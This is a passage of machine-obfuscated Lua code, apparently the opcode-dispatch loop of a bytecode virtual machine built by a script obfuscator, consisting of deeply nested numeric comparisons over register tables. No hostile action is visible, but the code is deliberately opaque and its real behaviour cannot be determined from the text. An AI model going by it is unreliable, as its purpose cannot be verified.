not(not(194~=z))then local a=0 while true do if((a<6)or(a==6))then if(not(a~=2)or a<2)then if(a<0 or a==0)then w[y[654]]=w[y[131]][y[216]];else if(1<a)then y=f[n];else n=(n+1);end end else if(a==4 or a<4)then if(4>a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if not(not(6~=a))then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if((a<9)or not(a~=9))then if((a<7)or not(a~=7))then n=(n+1);else if(9>a)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if(a<11 or a==11)then if not(not(11~=a))then n=(n+1);else y=f[n];end else if(13>a)then n=y[131];else break end end end end a=(a+1)end else if not w[y[654]]then n=(n+1);else n=y[131];end;end;elseif((195==z)or(195>z))then local a,c,e,m=0 while true do if(a<=9)then if((a<4)or not(a~=4))then if(a==1 or a<1)then if(a>0)then e=nil else c=nil end else if(a==2 or a<2)then m=nil else if(3<a)then n=(n+1);else w[y[654]]=h[y[131]];end end end else if(a<=6)then if(5<a)then w[y[654]]=h[y[131]];else y=f[n];end else if(a<=7)then n=(n+1);else if(9>a)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if(a==14 or a<14)then if(a<11 or a==11)then if(a>10)then y=f[n];else n=n+1;end else if(a<12 or a==12)then w[y[654]]=w[y[131]][w[y[216]]];else if(a<14)then n=(n+1);else y=f[n];end end end else if(a<=16)then if(15<a)then e={w[m](w[m+1])};else m=y[654]end else if(a==17 or a<17)then c=0;else if not(not(19~=a))then for ba=m,y[216]do c=(c+1);w[ba]=e[c];end else break end end end end end a=(a+1)end elseif(197>z)then w[y[654]]=h[y[131]];else local a,c,e,m=0 while true do if(a<=9)then if(a<4 or a==4)then if(a<1 or a==1)then if(a~=1)then c=nil else e=nil end else if(not(a~=2)or(a<2))then m=nil else if(a<4)then w[y[654]]=h[y[131]];else n=(n+1);end end end else if(a<=6)then if(a<6)then y=f[n];else w[y[654]]=h[y[131]];end else if(a<7 or a==7)then n=n+1;else if 8<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end end else if(a<=14)then if(a<=11)then if(10<a)then y=f[n];else n=(n+1);end else if((a<12)or not(a~=12))then w[y[654]]=w[y[131]][w[y[216]]];else if not(a==14)then n=(n+1);else y=f[n];end end end else if(a<16 or not(a~=16))then if(16~=a)then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if(19>a)then for ba=m,y[216]do c=(c+1);w[ba]=e[c];end else break end end end end end a=(a+1)end end;elseif((203>z)or not(203~=z))then if(z<200 or z==200)then if(z<=198)then w[y[654]]={};elseif(200>z)then local a,c,e,m=0 while true do if(a<9 or a==9)then if a<=4 then if(a==1 or a<1)then if(a>0)then e=nil else c=nil end else if(a<2 or a==2)then m=nil else if(a<4)then w[y[654]]=h[y[131]];else n=(n+1);end end end else if(a<=6)then if 6>a then y=f[n];else w[y[654]]=h[y[131]];end else if(a==7 or a<7)then n=n+1;else if 9>a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if(a<14 or a==14)then if(a<11 or a==11)then if a==10 then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 14~=a then n=n+1;else y=f[n];end end end else if(a<16 or a==16)then if a>15 then e={w[m](w[m+1])};else m=y[654]end else if(a==17 or a<17)then c=0;else if 19~=a then for ba=m,y[216]do c=c+1;w[ba]=e[c];end else break end end end end end a=(a+1)end else local a=0 while true do if(a<14 or a==14)then if a<=6 then if(a==2 or a<2)then if(a<0 or a==0)then w={};else if not(a~=1)then for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;else n=(n+1);end end else if(a<=4)then if(a==3)then y=f[n];else w[y[654]]=h[y[131]];end else if not(a~=5)then n=n+1;else y=f[n];end end end else if(a<10 or a==10)then if(a<8 or a==8)then if 7==a then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(10~=a)then y=f[n];else w[y[654]]=h[y[131]];end end else if(a<12 or a==12)then if(12~=a)then n=(n+1);else y=f[n];end else if not(14==a)then w[y[654]]={};else n=n+1;end end end end else if a<=21 then if(a<17 or a==17)then if(a==15 or a<15)then y=f[n];else if 16<a then n=n+1;else w[y[654]]={};end end else if(a==19 or a<19)then if not(a~=18)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end else if(20<a)then y=f[n];else n=n+1;end end end else if(a==25 or a<25)then if a<=23 then if(a>22)then n=n+1;else w[y[654]]=j[y[131]];end else if(25~=a)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if(a<27 or a==27)then if not(a==27)then n=n+1;else y=f[n];end else if not(28~=a)then if w[y[654]]then n=n+1;else n=y[131];end;else break end end end end end a=(a+1)end end;elseif(201==z or 201>z)then local a=y[654]w[a]=w[a](r(w,(a+1),p))elseif(202==z)then local a,c=0 while true do if(a<7 or a==7)then if(a<=3)then if a<=1 then if(a<1)then c=nil else w[y[654]][y[131]]=w[y[216]];end else if(a==2)then n=n+1;else y=f[n];end end else if(a==5 or a<5)then if 4==a then w[y[654]]={};else n=(n+1);end else if a>6 then w[y[654]][y[131]]=y[216];else y=f[n];end end end else if a<=11 then if a<=9 then if not(a==9)then n=(n+1);else y=f[n];end else if a<11 then w[y[654]][y[131]]=w[y[216]];else n=(n+1);end end else if(a<13 or a==13)then if not(a==13)then y=f[n];else c=y[654]end else if(15>a)then w[c]=w[c](r(w,(c+1),y[131]))else break end end end end a=(a+1)end else local a,c=0 while true do if(a<=7)then if a<=3 then if(a<=1)then if(a==0)then c=nil else w[y[654]][y[131]]=w[y[216]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if(5~=a)then w[y[654]]={};else n=n+1;end else if not(7==a)then y=f[n];else w[y[654]][y[131]]=y[216];end end end else if a<=11 then if(a<=9)then if 8<a then y=f[n];else n=n+1;end else if a>10 then n=n+1;else w[y[654]][y[131]]=w[y[216]];end end else if(a<=13)then if(12<a)then c=y[654]else y=f[n];end else if a>14 then break else w[c]=w[c](r(w,(c+1),y[131]))end end end end a=a+1 end end;elseif(206>z or(206==z))then if(204>z or 204==z)then local a,c=0 while true do if(a<8 or a==8)then if(a<=3)then if(a==1 or a<1)then if(1>a)then c=nil else w[y[654]]=w[y[131]][y[216]];end else if(a~=3)then n=(n+1);else y=f[n];end end else if(a<=5)then if 5>a then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(a==6 or a<6)then y=f[n];else if(8>a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end end end end else if(a<13 or not(a~=13))then if(a<10 or a==10)then if(not(a==10))then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if(a<=11)then n=(n+1);else if a<13 then y=f[n];else w[y[654]]=false;end end end else if((a<15)or a==15)then if(14==a)then n=(n+1);else y=f[n];end else if(a==16 or a<16)then c=y[654]else if(18>a)then w[c](w[(c+1)])else break end end end end end a=a+1 end elseif(z<206)then local a,c,e,m=0 while true do if(a==9 or a<9)then if(a==4 or a<4)then if a<=1 then if a<1 then c=nil else e=nil end else if(a==2 or a<2)then m=nil else if(4~=a)then w[y[654]]=h[y[131]];else n=(n+1);end end end else if(a==6 or a<6)then if a<6 then y=f[n];else w[y[654]]=h[y[131]];end else if(a<=7)then n=(n+1);else if not(a==9)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if(a==14 or a<14)then if(a==11 or a<11)then if(a==10)then n=(n+1);else y=f[n];end else if(a<=12)then w[y[654]]=w[y[131]][w[y[216]]];else if(a>13)then y=f[n];else n=(n+1);end end end else if a<=16 then if not(a==16)then m=y[654]else e={w[m](w[m+1])};end else if(a<17 or a==17)then c=0;else if not(a~=18)then for ba=m,y[216]do c=(c+1);w[ba]=e[c];end else break end end end end end a=a+1 end else local a=0 while true do if(a<7 or a==7)then if(a==3 or a<3)then if(a==1 or a<1)then if(a==0)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(3~=a)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if(a<5 or a==5)then if(4<a)then y=f[n];else n=n+1;end else if a~=7 then w[y[654]]=h[y[131]];else n=(n+1);end end end else if(a<11 or a==11)then if(a==9 or a<9)then if(9>a)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if(a~=11)then n=n+1;else y=f[n];end end else if a<=13 then if a~=13 then w[y[654]][y[131]]=w[y[216]];else n=n+1;end else if(a==14 or a<14)then y=f[n];else if(16~=a)then do return w[y[654]]end else break end end end end end a=a+1 end end;elseif(z==207 or z<207)then local a=y[654];local c,e,m=w[a],w[(a+1)],w[(a+2)];local c=(c+m);w[a]=c;if(m>0 and c<=e or m<0 and c>=e)then n=y[131];w[(a+3)]=c;end;elseif not(not(208==z))then local a=y[654]w[a](w[(a+1)])else local a,c=0 while true do if(a==8 or a<8)then if(a<3 or a==3)then if(a==1 or a<1)then if a>0 then w[y[654]]=j[y[131]];else c=nil end else if not(a==3)then n=(n+1);else y=f[n];end end else if(a<5 or a==5)then if not(a~=4)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(a<6 or a==6)then y=f[n];else if not(a~=7)then w[y[654]]=y[131];else n=(n+1);end end end end else if a<=13 then if(a==10 or a<10)then if not(a~=9)then y=f[n];else w[y[654]]=y[131];end else if(a==11 or a<11)then n=n+1;else if(13>a)then y=f[n];else w[y[654]]=y[131];end end end else if(a<15 or a==15)then if 15>a then n=n+1;else y=f[n];end else if(a<=16)then c=y[654]else if not(a~=17)then w[c]=w[c](r(w,c+1,y[131]))else break end end end end end a=a+1 end end;elseif 221>=z then if(215>z or 215==z)then if(z<=212)then if z<=210 then local a=y[654];local c=w[a];for e=(a+1),p do t(c,w[e])end;elseif not(not(211==z))then local a=0 while true do if(a==14 or a<14)then if(a==6 or a<6)then if(a==2 or a<2)then if(a<0 or a==0)then w={};else if not(2==a)then for c=0,u,1 do if(c<o)then w[c]=s[(c+1)];else break;end;end;else n=(n+1);end end else if(a==4 or a<4)then if 3==a then y=f[n];else w[y[654]]=h[y[131]];end else if not(6==a)then n=n+1;else y=f[n];end end end else if(a==10 or a<10)then if(a==8 or a<8)then if(8~=a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if 9<a then w[y[654]]=h[y[131]];else y=f[n];end end else if(a<=12)then if(11==a)then n=n+1;else y=f[n];end else if(a>13)then n=(n+1);else w[y[654]]={};end end end end else if(a<=21)then if(a==17 or a<17)then if(a==15 or a<15)then y=f[n];else if 16<a then n=n+1;else w[y[654]]={};end end else if(a==19 or a<19)then if(a<19)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end else if not(a==21)then n=n+1;else y=f[n];end end end else if(a<25 or a==25)then if(a<=23)then if 22<a then n=n+1;else w[y[654]]=j[y[131]];end else if(24<a)then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end else if a<=27 then if 27~=a then n=n+1;else y=f[n];end else if 29>a then if w[y[654]]then n=(n+1);else n=y[131];end;else break end end end end end a=(a+1)end else w[y[654]]=(w[y[131]]%w[y[216]]);end;elseif(z<213 or z==213)then n=y[131];elseif 215>z then w[y[654]]=(w[y[131]]/y[216]);else local a=y[654];p=a+x-1;for c=a,p do local a=q[c-a];w[c]=a;end;end;elseif(218>z or 218==z)then if(216>z or 216==z)then local a,c=0 while true do if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 1==a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=3 then y=f[n];else if a<5 then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=8 then if a<=6 then y=f[n];else if 8~=a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=9 then y=f[n];else if a>10 then n=n+1;else w[y[654]]=h[y[131]];end end end end else if a<=17 then if a<=14 then if a<=12 then y=f[n];else if 13<a then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end else if a<=15 then y=f[n];else if 17>a then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=20 then if a<=18 then y=f[n];else if 19==a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=22 then if a==21 then y=f[n];else c=y[654]end else if a<24 then w[c]=w[c](r(w,c+1,y[131]))else break end end end end end a=a+1 end elseif(z==217)then w[y[654]]=(w[y[131]]-y[216]);else local a=y[654];do return w[a](r(w,(a+1),y[131]))end;end;elseif(z==219 or z<219)then w[y[654]]=y[131];elseif(221~=z)then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[654]]=w[y[131]][y[216]];else if 1==a then n=n+1;else y=f[n];end end else if a<=4 then if a<4 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 5==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if a<=9 then if a<=7 then n=n+1;else if 9~=a then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if a<=11 then if a<11 then n=n+1;else y=f[n];end else if 13~=a then n=y[131];else break end end end end a=a+1 end else local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<=2 then m=nil else if a==3 then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=6 then if a>5 then w[y[654]]=h[y[131]];else y=f[n];end else if a<=7 then n=n+1;else if 8==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if 10<a then y=f[n];else n=n+1;end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13<a then y=f[n];else n=n+1;end end end else if a<=16 then if a~=16 then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if a==18 then for q=m,y[216]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end end;elseif z<=227 then if(224==z or 224>z)then if 222>=z then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0<a then e=nil else c=nil end else if a<=2 then m=nil else if a==3 then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=6 then if a<6 then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if 8==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if 10==a then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 14>a then n=n+1;else y=f[n];end end end else if a<=16 then if a~=16 then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 19~=a then for q=m,y[216]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end elseif(224~=z)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 1>a then c=nil else w[y[654]]=w[y[131]][y[216]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if a<5 then w[y[654]]=h[y[131]];else n=n+1;end else if a<=6 then y=f[n];else if a~=8 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9==a then y=f[n];else w[y[654]]=y[131];end else if a<=11 then n=n+1;else if a<13 then y=f[n];else w[y[654]]=y[131];end end end else if a<=15 then if a~=15 then n=n+1;else y=f[n];end else if a<=16 then c=y[654]else if a~=18 then w[c]=w[c](r(w,c+1,y[131]))else break end end end end end a=a+1 end else w[y[654]]=true;end;elseif(z<=225)then w[y[654]]=w[y[131]]-y[216];elseif 226==z then local a,c,e,m=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<3 then m=nil else w[y[654]]=h[y[131]];end end else if a<=5 then if a<5 then n=n+1;else y=f[n];end else if a<7 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end else if a<=11 then if a<=9 then if 8==a then y=f[n];else w[y[654]]=h[y[131]];end else if a==10 then n=n+1;else y=f[n];end end else if a<=13 then if a==12 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a==14 then y=f[n];else w[y[654]]=w[y[131]][w[y[216]]];end end end end else if a<=23 then if a<=19 then if a<=17 then if 17>a then n=n+1;else y=f[n];end else if 18<a then n=n+1;else w[y[654]]=h[y[131]];end end else if a<=21 then if 20==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if 22==a then n=n+1;else y=f[n];end end end else if a<=27 then if a<=25 then if a~=25 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a<27 then y=f[n];else m=y[131];end end else if a<=29 then if 28==a then e=y[216];else c=k(w,g,m,e);end else if a>30 then break else w[y[654]]=c;end end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1>a then c=nil else w[y[654]]=w[y[131]];end else if a==2 then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[654]]=y[131];else n=n+1;end else if 7~=a then y=f[n];else w[y[654]]=y[131];end end end else if a<=11 then if a<=9 then if 9>a then n=n+1;else y=f[n];end else if a<11 then w[y[654]]=y[131];else n=n+1;end end else if a<=13 then if 12<a then c=y[654]else y=f[n];end else if 15~=a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=a+1 end end;elseif z<=230 then if(z<=228)then local a,c,e,m=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a>0 then e=nil else c=nil end else if a<3 then m=nil else w[y[654]]=h[y[131]];end end else if a<=5 then if a==4 then n=n+1;else y=f[n];end else if a>6 then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end end else if a<=11 then if a<=9 then if a~=9 then y=f[n];else w[y[654]]=h[y[131]];end else if 11~=a then n=n+1;else y=f[n];end end else if a<=13 then if a~=13 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 14==a then y=f[n];else w[y[654]]=w[y[131]][w[y[216]]];end end end end else if a<=23 then if a<=19 then if a<=17 then if 17>a then n=n+1;else y=f[n];end else if a<19 then w[y[654]]=h[y[131]];else n=n+1;end end else if a<=21 then if a<21 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if a<23 then n=n+1;else y=f[n];end end end else if a<=27 then if a<=25 then if 25~=a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 27>a then y=f[n];else m=y[131];end end else if a<=29 then if 28==a then e=y[216];else c=k(w,g,m,e);end else if a<31 then w[y[654]]=c;else break end end end end end a=a+1 end elseif not(z~=229)then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then e=nil else c=nil end else if a<=2 then m=nil else if a<4 then w[y[654]]=j[y[131]];else n=n+1;end end end else if a<=6 then if a>5 then w[y[654]]=w[y[131]][y[216]];else y=f[n];end else if a<=7 then n=n+1;else if a<9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if a>10 then y=f[n];else n=n+1;end else if a<=12 then w[y[654]]=w[y[131]][y[216]];else if 14~=a then n=n+1;else y=f[n];end end end else if a<=16 then if 15<a then e={w[m](w[m+1])};else m=y[654]end else if a<=17 then c=0;else if a>18 then break else for q=m,y[216]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end else local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[654]]=w[y[131]][y[216]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if 5~=a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a<=6 then y=f[n];else if a==7 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 10>a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if a<=11 then n=n+1;else if a==12 then y=f[n];else w[y[654]]=false;end end end else if a<=15 then if 14==a then n=n+1;else y=f[n];end else if a<=16 then c=y[654]else if 17<a then break else w[c](w[c+1])end end end end end a=a+1 end end;elseif(231>=z)then local a=y[654]w[a]=w[a]()elseif z<233 then local a=y[654];do return r(w,a,p)end;else w[y[654]]=false;n=n+1;end;elseif(z==256 or z<256)then if(244==z or 244>z)then if(238==z or 238>z)then if(235>z or 235==z)then if not(not(z==234))then local a=0 while true do if(a==8 or a<8)then if((a<3)or not(a~=3))then if((a<1)or not(a~=1))then if a~=1 then w={};else for c=0,u,1 do if c<o then w[c]=s[(c+1)];else break;end;end;end else if not(not(a==2))then n=(n+1);else y=f[n];end end else if(a==5 or(a<5))then if not(not(5~=a))then w[y[654]]=h[y[131]];else n=(n+1);end else if(a<=6)then y=f[n];else if(8>a)then w[y[654]]=(w[y[131]]+y[216]);else n=(n+1);end end end end else if(a<=12)then if(a==10 or a<10)then if not(10==a)then y=f[n];else h[y[131]]=w[y[654]];end else if(11<a)then y=f[n];else n=(n+1);end end else if(a==14 or a<14)then if 14>a then w[y[654]]=h[y[131]];else n=(n+1);end else if(a<15 or a==15)then y=f[n];else if not(not(a~=17))then w[y[654]]();else break end end end end end a=(a+1)end else local a=0 while true do if(a<7 or a==7)then if(a==3 or a<3)then if(a==1 or a<1)then if(a<1)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(3>a)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if(a<5 or not(a~=5))then if a<5 then n=(n+1);else y=f[n];end else if(a<7)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end end end else if(a==11 or a<11)then if(a<9 or a==9)then if 8<a then w[y[654]]=h[y[131]];else y=f[n];end else if(10<a)then y=f[n];else n=(n+1);end end else if(a<=13)then if(13>a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(a<14 or a==14)then y=f[n];else if not(not(15==a))then if(not(w[y[654]]==w[y[216]]))then n=(n+1);else n=y[131];end;else break end end end end end a=a+1 end end;elseif(z==236 or z<236)then local a,c,e,m=0 while true do if(a==9 or a<9)then if(a<4 or a==4)then if(a==1 or a<1)then if(a>0)then e=nil else c=nil end else if(a<2 or a==2)then m=nil else if(a>3)then n=(n+1);else w[y[654]]=h[y[131]];end end end else if(a<=6)then if not(a==6)then y=f[n];else w[y[654]]=h[y[131]];end else if(a<7 or a==7)then n=(n+1);else if a<9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if(a<14 or a==14)then if(a==11 or a<11)then if(10<a)then y=f[n];else n=n+1;end else if(a<=12)then w[y[654]]=w[y[131]][w[y[216]]];else if not(not(13==a))then n=(n+1);else y=f[n];end end end else if(a<=16)then if not(not(a~=16))then m=y[654]else e={w[m](w[m+1])};end else if(a<17 or a==17)then c=0;else if(18<a)then break else for q=m,y[216]do c=(c+1);w[q]=e[c];end end end end end end a=(a+1)end elseif(not(z~=237))then local a,c,e,m=0 while true do if(a<=9)then if(a==4 or a<4)then if(a<=1)then if not(0~=a)then c=nil else e=nil end else if(a<=2)then m=nil else if 4~=a then w[y[654]]=h[y[131]];else n=(n+1);end end end else if(a<=6)then if not(not(5==a))then y=f[n];else w[y[654]]=h[y[131]];end else if(a==7 or a<7)then n=(n+1);else if 8<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end end else if(a==14 or a<14)then if(a<=11)then if not(not(a==10))then n=n+1;else y=f[n];end else if(a<12 or a==12)then w[y[654]]=w[y[131]][w[y[216]]];else if not(a~=13)then n=n+1;else y=f[n];end end end else if(a<16 or a==16)then if(not(a==16))then m=y[654]else e={w[m](w[m+1])};end else if(a<17 or(a==17))then c=0;else if(19~=a)then for q=m,y[216]do c=c+1;w[q]=e[c];end else break end end end end end a=(a+1)end else local a,c=0 while true do if(a<8 or a==8)then if(not(a~=3)or(a<3))then if(a<1 or a==1)then if(1>a)then c=nil else w[y[654]]=w[y[131]][y[216]];end else if not(a==3)then n=(n+1);else y=f[n];end end else if(a==5 or(a<5))then if(5>a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(a<=6)then y=f[n];else if(a>7)then n=(n+1);else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=13 then if(a==10 or a<10)then if not(not(a==9))then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if((a==11)or(a<11))then n=(n+1);else if(13>a)then y=f[n];else w[y[654]]=false;end end end else if((a<15)or(a==15))then if(a<15)then n=(n+1);else y=f[n];end else if(a==16 or a<16)then c=y[654]else if 18>a then w[c](w[(c+1)])else break end end end end end a=(a+1)end end;elseif(z==241 or z<241)then if((239>z)or(239==z))then local a,c=0 while true do if(a==22 or a<22)then if a<=10 then if(a==4 or a<4)then if(a<=1)then if 0<a then w[y[654]]=w[y[131]][y[216]];else c=nil end else if(a==2 or a<2)then n=(n+1);else if(4>a)then y=f[n];else w[y[654]]=h[y[131]];end end end else if(a<=7)then if(a==5 or a<5)then n=(n+1);else if(a~=7)then y=f[n];else w[y[654]]=h[y[131]];end end else if(a==8 or a<8)then n=(n+1);else if a<10 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=16 then if a<=13 then if(a==11 or a<11)then n=n+1;else if a>12 then w[y[654]]=w[y[131]][w[y[216]]];else y=f[n];end end else if(a<14 or a==14)then n=(n+1);else if(a~=16)then y=f[n];else w[y[654]]={};end end end else if(a<19 or a==19)then if(a<17 or a==17)then n=n+1;else if not(19==a)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if(a<=20)then n=(n+1);else if not(a==22)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end end end end else if a<=33 then if a<=27 then if(a<=24)then if(a<24)then n=n+1;else y=f[n];end else if a<=25 then w[y[654]]=h[y[131]];else if(a>26)then y=f[n];else n=n+1;end end end else if(a==30 or a<30)then if(a<28 or a==28)then w[y[654]]=w[y[131]][y[216]];else if(a<30)then n=n+1;else y=f[n];end end else if(a==31 or a<31)then w[y[654]][y[131]]=w[y[216]];else if 32<a then y=f[n];else n=n+1;end end end end else if a<=39 then if(a<36 or a==36)then if(a<34 or a==34)then w[y[654]]=h[y[131]];else if(36>a)then n=n+1;else y=f[n];end end else if(a<=37)then w[y[654]]=w[y[131]][y[216]];else if a>38 then y=f[n];else n=(n+1);end end end else if(a==42 or a<42)then if a<=40 then w[y[654]][y[131]]=w[y[216]];else if a<42 then n=(n+1);else y=f[n];end end else if(a<=43)then c=y[654]else if not(a~=44)then w[c](r(w,c+1,y[131]))else break end end end end end end a=(a+1)end elseif(240<z)then if not w[y[654]]then n=(n+1);else n=y[131];end;else local a,c,e,m=0 while true do if(a==9 or a<9)then if(a<=4)then if(a<=1)then if not(a==1)then c=nil else e=nil end else if(a<=2)then m=nil else if 4>a then w[y[654]]=h[y[131]];else n=n+1;end end end else if(a<6 or a==6)then if a==5 then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if(a<9)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if(a<11 or a==11)then if(a==10)then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if not(a~=13)then n=(n+1);else y=f[n];end end end else if(a<=16)then if(15==a)then m=y[654]else e={w[m](w[m+1])};end else if(a<=17)then c=0;else if(18<a)then break else for q=m,y[216]do c=c+1;w[q]=e[c];end end end end end end a=(a+1)end end;elseif(z==242 or z<242)then local a=0 while true do if a<=9 then if(a<4 or a==4)then if(a<=1)then if not(a~=0)then w={};else for c=0,u,1 do if(c<o)then w[c]=s[c+1];else break;end;end;end else if(a<=2)then n=(n+1);else if 4>a then y=f[n];else w[y[654]]=y[131];end end end else if(a<6 or a==6)then if not(5~=a)then n=(n+1);else y=f[n];end else if(a<=7)then w[y[654]]=h[y[131]];else if(9>a)then n=n+1;else y=f[n];end end end end else if(a==14 or a<14)then if a<=11 then if(a>10)then n=(n+1);else w[y[654]]=h[y[131]];end else if(a<=12)then y=f[n];else if a~=14 then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end end end else if a<=17 then if a<=15 then y=f[n];else if a~=17 then w[y[654]]=w[y[131]][w[y[216]]];else n=(n+1);end end else if(a==18 or a<18)then y=f[n];else if(20>a)then if(not(w[y[654]]==y[216]))then n=n+1;else n=y[131];end;else break end end end end end a=(a+1)end elseif not(243~=z)then local a,c,e=0 while true do if(a<=24)then if(a<=11)then if(a<5 or a==5)then if(a<=2)then if(a==0 or a<0)then c=nil else if 2>a then e=nil else w[y[654]]={};end end else if(a==3 or a<3)then n=(n+1);else if(4==a)then y=f[n];else w[y[654]]=h[y[131]];end end end else if(a<=8)then if(a<6 or a==6)then n=(n+1);else if(8~=a)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if(a<9 or a==9)then n=(n+1);else if not(11==a)then y=f[n];else w[y[654]]=h[y[131]];end end end end else if a<=17 then if(a<14 or a==14)then if(a<12 or a==12)then n=n+1;else if 14>a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if(a<=15)then n=n+1;else if a<17 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if(a==20 or a<20)then if(a<18 or a==18)then n=(n+1);else if not(a~=19)then y=f[n];else w[y[654]]={};end end else if a<=22 then if a>21 then y=f[n];else n=(n+1);end else if not(a==24)then w[y[654]]={};else n=n+1;end end end end end else if a<=37 then if(a==30 or a<30)then if a<=27 then if(a<=25)then y=f[n];else if(a>26)then n=(n+1);else w[y[654]]=h[y[131]];end end else if(a<28 or a==28)then y=f[n];else if not(a~=29)then w[y[654]][y[131]]=w[y[216]];else n=n+1;end end end else if(a<33 or a==33)then if(a==31 or a<31)then y=f[n];else if 32<a then n=n+1;else w[y[654]]=h[y[131]];end end else if(a<=35)then if(a>34)then w[y[654]][y[131]]=w[y[216]];else y=f[n];end else if(a>36)then y=f[n];else n=n+1;end end end end else if(a<43 or a==43)then if(a==40 or a<40)then if(a==38 or a<38)then w[y[654]][y[131]]=w[y[216]];else if 39<a then y=f[n];else n=(n+1);end end else if(a<=41)then w[y[654]]={r({},1,y[131])};else if(a<43)then n=n+1;else y=f[n];end end end else if(a==46 or a<46)then if(a<44 or a==44)then w[y[654]]=w[y[131]];else if(45<a)then y=f[n];else n=n+1;end end else if(a<48 or a==48)then if(a~=48)then e=y[654];else c=w[e];end else if 49<a then break else for 